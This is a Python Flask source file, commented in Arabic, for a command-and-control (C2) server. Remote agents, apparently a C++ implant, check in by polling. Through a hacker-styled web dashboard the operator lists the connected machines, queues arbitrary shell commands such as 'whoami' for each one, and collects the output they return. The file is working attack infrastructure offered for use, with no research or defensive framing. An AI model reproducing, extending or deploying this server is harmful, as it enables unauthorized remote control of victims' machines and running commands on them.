from flask import Flask, request, jsonify, render_template_string
import time
from datetime import datetime
import json

app = Flask(__name__)

# مخازن البيانات في الذاكرة
agents = {}          # لتخزين الأجهزة المتصلة
pending_commands = {} # لتخزين الأوامر التي تنتظر التنفيذ
results = {}         # لتخزين نتائج الأوامر المستلمة

# ---------------------------------------------------------
# لوحة التحكم (الواجهة الرسومية)
# ---------------------------------------------------------
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>C2 Control Panel</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f0f0f; color: #00ff00; padding: 20px; }
        .container { max-width: 1000px; margin: auto; }
        .card { background: #1a1a1a; border: 1px solid #333; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
        table { width: 100%; border-collapse: collapse; background: #111; }
        th, td { padding: 12px; border: 1px solid #333; text-align: center; }
        th { background: #222; color: #00ff00; }
        tr:hover { background: #252525; }
        input[type="text"] { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 5px; width: 150px; }
        button { background: #00ff00; color: #000; border: none; padding: 5px 15px; cursor: pointer; font-weight: bold; }
        .status-online { color: #00ff00; font-weight: bold; animation: blink 2s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>🎮 نظام التحكم المركزي (C2 Server)</h1>
            <p>حالة السيرفر: <span class="status-online">LIVE</span> | الأجهزة النشطة: {{ agents|length }}</p>
        </div>

        <div class="card">
            <h3>🖥️ الأجهزة المتصلة</h3>
            <table>
                <thead>
                    <tr>
                        <th>المعرف (ID)</th>
                        <th>عنوان IP</th>
                        <th>آخر ظهور</th>
                        <th>الحالة</th>
                        <th>إجراء</th>
                    </tr>
                </thead>
                <tbody>
                    {% for id, info in agents.items() %}
                    <tr>
                        <td>{{ id }}</td>
                        <td>{{ info.ip }}</td>
                        <td>{{ info.last_seen }}</td>
                        <td class="status-online">Online</td>
                        <td>
                            <form action="/send-command" method="POST" style="display:inline;">
                                <input type="hidden" name="agent_id" value="{{ id }}">
                                <input type="text" name="command" placeholder="أمر (whoami)" required>
                                <button type="submit">إرسال</button>
                            </form>
                        </td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>

        <div class="card">
            <h3>📜 سجل النتائج</h3>
            <div style="max-height: 200px; overflow-y: auto;">
                {% for res in results_list %}
                <p style="border-bottom: 1px solid #333; padding: 5px;">
                    <strong style="color: #fff;">[{{ res.time }}] {{ res.agent_id }}:</strong> {{ res.output }}
                </p>
                {% endfor %}
            </div>
        </div>
    </div>
</body>
</html>
"""

# ---------------------------------------------------------
# نقاط استقبال البيانات من العميل (C++)
# ---------------------------------------------------------

@app.route('/', methods=['GET'])
def dashboard():
    # تحويل النتائج إلى قائمة مرتبة زمنياً للعرض
    results_list = sorted(results.values(), key=lambda x: x['time'], reverse=True)
    return render_template_string(HTML_TEMPLATE, agents=agents, results_list=results_list)

# هذا المسار سيعالج أي طلب POST يصل للسيرفر لضمان تسجيل الجهاز
@app.route('/api/v1/agent/poll', methods=['POST'])
@app.route('/poll', methods=['POST'])
@app.route('/heartbeat', methods=['POST'])
def handle_agent():
    try:
        # طباعة الطلب في Logs لتعرف ما يحدث
        print(f"\n[!] Incoming request from: {request.remote_addr} on path: {request.path}")
        
        # محاولة قراءة البيانات القادمة
        data = request.get_json(silent=True) or {}
        
        # إذا لم يرسل العميل ID، سنصنع له واحداً بناءً على الـ IP
        agent_id = data.get('agent_id') or f"PC_{request.remote_addr.replace('.', '_')}"

        # تسجيل وتحديث بيانات الجهاز
        agents[agent_id] = {
            'last_seen': datetime.now().strftime("%H:%M:%S"),
            'ip': request.remote_addr,
            'system_info': data.get('system_info', 'N/A')
        }

        # التحقق إذا كان هناك أمر ينتظر هذا الجهاز
        response_data = {'has_command': False}
        if agent_id in pending_commands and pending_commands[agent_id]:
            cmd = pending_commands[agent_id].pop(0)
            response_data = {
                'has_command': True,
                'command_id': cmd['id'],
                'command': cmd['cmd'],
                'args': []
            }
            print(f"[+] Command sent to {agent_id}: {cmd['cmd']}")

        return jsonify(response_data), 200

    except Exception as e:
        print(f"[-] Error handling agent: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/v1/agent/result', methods=['POST'])
def handle_result():
    try:
        data = request.get_json(silent=True) or {}
        agent_id = data.get('agent_id', 'Unknown')
        output = data.get('output', 'No Output')
        
        res_id = f"{agent_id}_{int(time.time())}"
        results[res_id] = {
            'agent_id': agent_id,
            'output': output,
            'time': datetime.now().strftime("%H:%M:%S")
        }
        print(f"[V] Result from {agent_id}: {output}")
        return jsonify({'status': 'ok'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/send-command', methods=['POST'])
def send_command():
    agent_id = request.form.get('agent_id')
    cmd_text = request.form.get('command')
    if agent_id and cmd_text:
        if agent_id not in pending_commands:
            pending_commands[agent_id] = []
        pending_commands[agent_id].append({
            'id': str(int(time.time())),
            'cmd': cmd_text
        })
    return '<script>window.location.href="/";</script>'

if __name__ == '__main__':
    # تشغيل السيرفر على المنفذ 8080 (Render سيحوله لـ 80/443 تلقائياً)
    app.run(host='0.0.0.0', port=8080)
